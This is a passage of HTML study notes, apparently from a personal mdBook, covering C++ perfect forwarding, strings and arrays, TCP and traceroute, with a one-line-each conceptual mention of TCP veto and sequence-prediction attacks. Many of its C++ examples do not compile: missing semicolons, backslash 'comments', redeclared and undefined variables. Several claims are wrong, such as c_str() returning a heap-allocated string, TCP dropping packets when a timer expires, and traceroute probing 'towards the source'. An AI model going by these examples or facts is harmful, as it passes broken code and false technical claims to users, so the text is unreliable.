<li>Case 3: The infamous <code>const_cast</code>. Can lead to undefined behaviour.</li>
<li>Case 4: Handle all combinations. Overloads become exponential with the number of parameters.</li>
</ul>
<h2 id="what-stdforward-does"><a class="header" href="#what-stdforward-does">What std::forward does</a></h2>
<ul>
<li>If <code>f</code> got an lvalue ref and <code>E</code> needs an lvalue ref, then it obviously works out. Neither of them can take ownership of the object so neither of them will have it.</li>
<li>If <code>f</code> got an rvalue ref and <code>E</code> needs an rvalue ref, it still checks out. Both can take ownership, both can have it. This mechanism also makes sure that <code>E</code> doesn’t receive it as an lvalue, which is what happens with an rvalue ref inside a function block (See <a href="notes/./rvalue_refs.html">rvalue refernces</a>)</li>
<li>If <code>f</code> got an lvalue ref and <code>E</code> needs an rvalue ref, it will be given an <strong>lvalue ref</strong>. This is because it cannot be given ownership of the object, since <code>f</code> doesn’t have it itself.</li>
<li>If <code>f</code> got an rvalue ref and <code>E</code> needs an lvalue ref, do we even care? Let it have that, it was going to get lvalue ref without intervention anyways.</li>
</ul>
<p>This combination is called as <strong>perfect forwarding</strong>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="strings-2"><a class="header" href="#strings-2">Strings</a></h1>
<p>Strings in C++ are used to store text or sequences of characters. C++ supports both C style strings and strings as a class.</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;
#include &lt;string&gt;
using namespace std;

//creating a new string using assignment
string greeting1 = "Hello ";

//Creating a new string using the constructor
string greeeting2("World");
</code></pre>
<p>There are various cons of using C-style strings:</p>
<ul>
<li>If allocated on the stack, it will always occupy a size you specify (a character occupies a byte assuming a byte is 8 bits long) no matter how long the text it contains is.</li>
<li>If allocated on the heap (using malloc()) or on the Free Store (new char[]) you’re responsible for releasing the memory afterwards and you will always have the overhead of a heap allocation.</li>
<li>If you copy a text of more than 256 chars into the array, it might crash, produce ugly assertion messages or cause unexplainable (mis-)behavior somewhere else in your program.</li>
<li>To determine the text’s length, the array has to be scanned, character by character, for a \0 character.</li>
<li>You need to check and handle oversized strings yourself else the code will be unsafe (looking at you <code>strcpy</code>).</li>
</ul>
<p>Pros of using C style strings:</p>
<ul>
<li>If it is a string literal, it is best to define it as a C style string since allocation on stack is much faster than heap.</li>
<li>It will certainly be faster lookup wise and memory wise.</li>
</ul>
<p>There are issues with <code>std::string</code> as well:</p>
<ul>
<li>Two distinct STL string instances can not share the same underlying buffer. So if we pass a string by value you will always get a new copy - there is some performance penalty.</li>
<li>Slower overall than stack allocated strings.</li>
</ul>
<p>However, the benefits are much more:</p>
<ul>
<li>Short strings of size 16 bytes (assuming 8 bits) or less are stored on the stack for faster access and less fragmentation of heap (or the Free Store).</li>
<li>They can contain embedded ‘\0’ characters.</li>
<li><code>string.size()</code> (or <code>string.length()</code>) have constant time complexity, unlike <code>strlen()</code>.</li>
<li>Appending and inserting characters and text have linear time complexity with the object being added in contrast to strcat being linear in both the array being added to and the array being added.</li>
<li>A <code>const</code> qualified string is hardcoded in memory. So it has zero runtime cost. But be aware while using it as it can literally be read through the binary data.</li>
</ul>
<pre><code class="language-cpp">// declare greeting 
string greeting = "aeblablo"

//accessing individual characters of a string
cout &lt;&lt; greeting1[1] &lt;&lt; " is 'e'" &lt;&lt; endl;

//Length of the string
cout &lt;&lt; greeting.length() &lt;&lt; endl;

//substring from the starting index for a specified length
// gives "ell" in this case
cout &lt;&lt; greeting.substr(1, 3) &lt;&lt; endl;

//adding two Strings
greeting = greeting1 + greeting2;
cout &lt;&lt; greeting &lt;&lt; endl;
//OR 
string second_greeting = greeting1.append(greeting2);
cout &lt;&lt; greeting &lt;&lt; endl;

//find a given substring in the string, starting from the given index
string.find(substring, index)
</code></pre>
<blockquote>
<p>In the above program, instead of <code>greeting1.length()</code>, we could also have used <code>greeting1.size()</code> as both are synonymous.</p>
</blockquote>
<blockquote>
<p>A special example: converting an <code>std::string</code> to a C style heap allocated string. <code>const char *myStringChars = myString.c_str();</code></p>
</blockquote>
<h1 id="arrays-1"><a class="header" href="#arrays-1">Arrays</a></h1>
<p>Arrays are uniform aggregates of one type. Declaration occurs as follows:</p>
<pre><code class="language-cpp">int main(){
    char arr[length];
    int nums[] = {4, 53, 5, 553, 3}
    nums[1] = 2  \\ but length can’t be changed
    int nums[10] = {2, 3} \\ till 10th index; last 8 would be 0
    nums[9] = 5
    cout &lt;&lt; nums[15]; \\ leads to segmentation fault, core dumped
    int bruh[] = {4, 53, 5, 553, 3}
    bruh[1] = 2  \\ but length can’t be changed
    int bruh[10] = {2, 3} \\ till 10th index; last 8 would be 0
    bruh[9] = 5
    int bruh[15]; \\ leads to an error
}
</code></pre>
<p>Similar to this 2D arrays can be declared as well.</p>
<p>The values for an array are only set to 0 if the length of the array is known at compile-time. If not, the values are garbage values (that may or may not be 0).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tcp"><a class="header" href="#tcp">tcp</a></h1>
<p>Transmission Control Protocol. Originated along with <a href="notes/ipv4.html">ipv4</a> and hence the entire system is called TC/IP. It’s IP Protocol Number is 6.</p>
<ul>
<li>
<p>IP packets may be lost, duplicated or out of order due to network congestion. TCP’s job is to rectify these errors.</p>
</li>
<li>
<p>Since it focuses on reliable connection rather than fast connection it may take a lot of time to deliver the addresses.</p>
</li>
<li>
<p>The sender keeps a timer and the receiver returns an acknowledgement on receiving the packet. If the timer expires before the acknowledgement is received, the packet is dropped immediately.</p>
</li>
<li>
<p>Contains checksum verifications and sequence numbers to maintain data integrity.</p>
</li>
<li>
<p>Can also selectively receive packets in broken sequences, say 1000-2000 and then 3000-3089. In this case, a flag called <strong>SACK</strong> (Selective Acknowledgement) can be set to 1, that allows the receiver to receive discontinuous blocks like these.</p>
</li>
<li>
<p>Usually TCP waits for the full packet to be created before it it sent. However, <strong>PSH</strong> flag can be used for sending data immediately without waiting for the buffer to get full.</p>
</li>
</ul>
<h2 id="vulns"><a class="header" href="#vulns">Vulns</a></h2>
<ul>
<li>
<p>TCP Veto: Add a malicious packet in between with a sequence number same as the one going to arrive next. The next one is silently dropped a duplicate one. This isn’t highly controllable but very resistant to detection.</p>
</li>
<li>
<p>Sequence prediction attacks: Create an entire sequence of packets and hijack the network to pretend you are the host.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="traceroute"><a class="header" href="#traceroute">traceroute</a></h1>
<p>A command line utility on Unix and NT (known as <code>tracert</code>) to know the hops and the IPs of the routers between the source and the destination.</p>
<p>Utilizes multiple <a href="notes/icmp.html">icmp</a> packets being sent towards the source with varied TTL numbers.</p>
<ul>
<li>First it will be set to 1, then each subsequent packet will have it incremented by 1.</li>
<li>each time the router will send a reply with the <strong>Time Exceeded in transit</strong> command (Type = 11, Code = 0).</li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
